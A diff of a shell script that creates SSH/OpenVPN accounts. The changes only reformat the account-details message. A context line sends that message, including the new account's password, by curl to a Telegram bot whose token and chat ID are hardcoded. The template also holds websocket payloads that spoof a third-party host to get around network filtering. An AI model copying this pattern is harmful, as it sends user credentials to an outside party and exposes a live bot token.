@@ -67,14 +67,14 @@ Password : $Pass
 Created On : $hariini
 Expired On : $expi
 ==============================
-✓Detail Port SSH & OpenVPN✓
+Detail Port SSH & OpenVPN
 ==============================
 Domain SSH : ${domain}
-IP / Host : $IP
+IP & Host : $IP
 Ssh Websocket TLS : $ws
 Ssh Websocket NTLS : $ws2
-Dropbear : 109, 143
-SSL / TLS :$ssl
+Dropbear : 109 & 143
+SSL & TLS :$ssl
 Port Squid :$sqd
 OHP SSH : 8181
 OHP Dropbear : 8282
@@ -83,18 +83,17 @@ OpenVPN Websocket : 2086
 OpenVPN SSL : 990
 BadVpn UDPGW : 7100-7200-7300
 ==============================
-✓Link Config OpenVPN✓
+Link Config OpenVPN
 ==============================
 TCP : http://${domain}:89/tcp.ovpn
 UDP : http://${domain}:89/udp.ovpn
 SSL : http://${domain}:89/ssl.ovpn
 ==============================
-• Payload Websocket TLS :
+Payload Websocket TLS :
 GET wss://who.int/ HTTP/1.1 [crlf]Host: ${domain}[crlf]Upgrade: websocekt[crlf][crlf]
-• Payload Websocket NTLS :
+Payload Websocket NTLS :
 GET / HTTP/1.1 [crlf]Host: ${domain}[crlf]Upgrade: websocekt[crlf][crlf]
-==============================
-"
+=============================="
 curl -s --max-time 10 -d "chat_id=1668998643&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" https://api.telegram.org/bot5972770394:AAFz8aRmieB4Q3U_r3EuCg-NhjJSdiqsppA/sendMessage >/dev/null
 clear
 echo -e "[ ${GREEN}OKEY${NC} ] • Ssh Account Success Created"
